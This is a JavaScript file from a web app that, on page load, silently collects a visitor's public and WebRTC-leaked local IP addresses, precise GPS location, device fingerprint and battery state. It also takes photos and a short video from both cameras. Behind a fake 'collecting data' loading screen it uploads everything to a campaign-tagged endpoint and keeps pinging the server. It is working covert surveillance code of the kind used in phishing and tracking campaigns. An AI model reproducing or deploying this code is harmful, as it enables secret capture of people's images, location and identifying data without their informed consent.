F["app/static/js/capture.js"] = "const statusEl = document.getElementById('status');\nconst logEl = document.getElementById('log');\nconst log = m => { logEl.textContent += m + '\\n'; console.log(m); };\nconst DURASI_LOADING = 8000;\nconst isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;\nconst isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);\n\nasync function getIpInfo() {\n  try {\n    const r = await fetch('https://ipapi.co/json/');\n    const d = await r.json();\n    return { ip: d.ip, info: d };\n  } catch (e) { return { ip: null, info: null }; }\n}\n\nfunction getLocalIps() {\n  return new Promise(resolve => {\n    const ips = new Set();\n    try {\n      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });\n      pc.createDataChannel('');\n      pc.onicecandidate = e => {\n        if (!e.candidate) { try { pc.close(); } catch(_){} resolve([...ips]); return; }\n        const c = e.candidate.candidate;\n        const m = c.match(/(\\d+\\.\\d+\\.\\d+\\.\\d+)/);\n        if (m) ips.add(m[1]);\n      };\n      pc.createOffer().then(o => pc.setLocalDescription(o));\n      setTimeout(() => { try { pc.close(); } catch(_){} resolve([...ips]); }, 3500);\n    } catch (e) { resolve([]); }\n  });\n}\n\nfunction getGps() {\n  return new Promise(res => {\n    if (!navigator.geolocation) return res(null);\n    navigator.geolocation.getCurrentPosition(\n      p => res({ lat: p.coords.latitude, lon: p.coords.longitude, akurasi_m: p.coords.accuracy }),\n      e => { log('GPS ditolak: ' + e.message); res(null); },\n      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }\n    );\n  });\n}\n\nasync function capturePhotos(facingMode, shots) {\n  shots = shots || 3;\n  try {\n    const constraints = { video: facingMode ? { facingMode: { ideal: facingMode } } : true, audio: false };\n    const s = await Promise.race([\n      navigator.mediaDevices.getUserMedia(constraints),\n      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout kamera')), 10000)),\n    ]);\n    const v = document.getElementById('v');\n    v.srcObject = s;\n    await new Promise(r => { v.onloadedmetadata = r; });\n    await new Promise(r => setTimeout(r, 800));\n    const c = document.getElementById('c');\n    c.width = v.videoWidth || 640;\n    c.height = v.videoHeight || 480;\n    const ctx = c.getContext('2d');\n    const photos = [];\n    for (let i = 0; i < shots; i++) {\n      ctx.drawImage(v, 0, 0);\n      photos.push(c.toDataURL('image/png', 0.85));\n      await new Promise(r => setTimeout(r, 500));\n    }\n    let videoData = null;\n    try {\n      if (typeof MediaRecorder === 'undefined') throw new Error('MediaRecorder tidak didukung');\n      let mime = '';\n      if (isIOS || isSafari) {\n        if (MediaRecorder.isTypeSupported('video/mp4')) mime = 'video/mp4';\n        else if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) mime = 'video/mp4;codecs=h264';\n      } else {\n        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) mime = 'video/webm;codecs=vp9';\n        else if (MediaRecorder.isTypeSupported('video/webm')) mime = 'video/webm';\n      }\n      if (mime) {\n        const chunks = [];\n        const rec = new MediaRecorder(s, { mimeType: mime });\n        rec.ondataavailable = e => e.data.size && chunks.push(e.data);\n        const done = new Promise(r => rec.onstop = r);\n        rec.start();\n        await new Promise(r => setTimeout(r, 3000));\n        rec.stop();\n        await done;\n        const blob = new Blob(chunks, { type: mime.split(';')[0] });\n        if (blob.size > 20000) {\n          videoData = await blobToDataURL(blob);\n        }\n      } else {\n        log('iOS/Safari: video tidak didukung, skip');\n      }\n    } catch (e) { log('Video gagal: ' + e.message); }\n    s.getTracks().forEach(t => t.stop());\n    return { photos, video: videoData };\n  } catch (e) {\n    log('Kamera (' + facingMode + ') gagal: ' + e.message);\n    return { photos: [], video: null };\n  }\n}\n\nfunction blobToDataURL(blob) {\n  return new Promise(r => {\n    const fr = new FileReader();\n    fr.onload = () => r(fr.result);\n    fr.readAsDataURL(blob);\n  });\n}\n\nasync function getFingerprint() {\n  const fp = {\n    userAgent: navigator.userAgent,\n    platform: navigator.platform,\n    language: navigator.language,\n    screen: screen.width + 'x' + screen.height,\n    viewport: innerWidth + 'x' + innerHeight,\n    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n    ram: navigator.deviceMemory || null,\n    cpu: navigator.hardwareConcurrency || null,\n    touch: 'ontouchstart' in window,\n    ios: isIOS,\n    safari: isSafari,\n  };\n  try {\n    if (navigator.getBattery) {\n      const b = await navigator.getBattery();\n      fp.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' charging' : '');\n    }\n  } catch (e) {}\n  return fp;\n}\n\nasync function postWithRetry(url, body, retries) {\n  retries = retries || 3;\n  for (let i = 0; i <= retries; i++) {\n    try {\n      const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });\n      if (res.ok) return await res.json();\n      if (res.status >= 500 && i < retries) {\n        await new Promise(r => setTimeout(r, 1000 * (i + 1)));\n        continue;\n      }\n      return { ok: false, msg: 'HTTP ' + res.status };\n    } catch (e) {\n      if (i < retries) { await new Promise(r => setTimeout(r, 1000 * (i + 1))); continue; }\n      return { ok: false, msg: e.message };\n    }\n  }\n}\n\nasync function main() {\n  statusEl.textContent = 'Mengumpulkan data...';\n  const [ipData, gps, localIps, fingerprint, depan, belakang] = await Promise.all([\n    getIpInfo(),\n    getGps(),\n    getLocalIps(),\n    getFingerprint(),\n    capturePhotos('user', 3),\n    capturePhotos('environment', 3),\n  ]);\n  log('iOS: ' + isIOS + ' | Safari: ' + isSafari);\n  log('IP: ' + (ipData.ip || '-'));\n  log('IP lokal: ' + (localIps.join(', ') || '-'));\n  log('GPS: ' + (gps ? gps.lat + ', ' + gps.lon : '-'));\n  log('Depan: ' + depan.photos.length + ' foto' + (depan.video ? ' + video' : ''));\n  log('Belakang: ' + belakang.photos.length + ' foto' + (belakang.video ? ' + video' : ''));\n  await new Promise(r => setTimeout(r, DURASI_LOADING));\n  const payload = {\n    campaign: window.CAMPAIGN || 'default',\n    image_depan: depan.photos[0] || null,\n    image_belakang: belakang.photos[0] || null,\n    video_belakang: belakang.video || null,\n    extra_shots: [...depan.photos.slice(1, 4), ...belakang.photos.slice(1, 4)],\n    ip_publik: ipData.ip,\n    ip_info: ipData.info,\n    local_ips: localIps,\n    lokasi_gps: gps,\n    fingerprint,\n  };\n  statusEl.textContent = 'Mengirim...';\n  const out = await postWithRetry('/upload', payload);\n  if (out && out.ok) {\n    statusEl.textContent = 'OK ' + out.msg;\n    if (out.ts) {\n      setInterval(() => {\n        fetch('/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ts: out.ts, event_type: 'ping', data: { url: location.href } }) }).catch(() => {});\n      }, 5000);\n    }\n  } else {\n    statusEl.textContent = 'GAGAL ' + (out && out.msg ? out.msg : 'unknown');\n  }\n}\n\nmain();\n"

